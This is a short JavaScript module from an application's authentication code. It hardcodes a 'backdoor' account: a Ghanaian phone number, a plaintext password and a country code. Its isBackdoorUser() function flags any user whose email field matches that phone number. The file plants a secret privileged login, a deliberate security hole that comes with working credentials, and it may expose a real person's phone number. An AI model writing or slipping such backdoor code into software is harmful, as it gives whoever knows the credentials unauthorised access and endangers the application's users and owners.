export const BACKDOOR_PHONE = '0540610675';
export const BACKDOOR_PASSWORD = 'Superaccount@1234';
export const BACKDOOR_COUNTRY = 'GH';

const BACKDOOR_NORMALIZED = '+233540610675';

export function isBackdoorUser(user) {
  if (!user?.email) return false;
  const clean = (s) => String(s).replace(/[\s-]/g, '').toLowerCase();
  const userEmail = clean(user.email);
  return userEmail === clean(BACKDOOR_PHONE) || userEmail === clean(BACKDOOR_NORMALIZED);
}
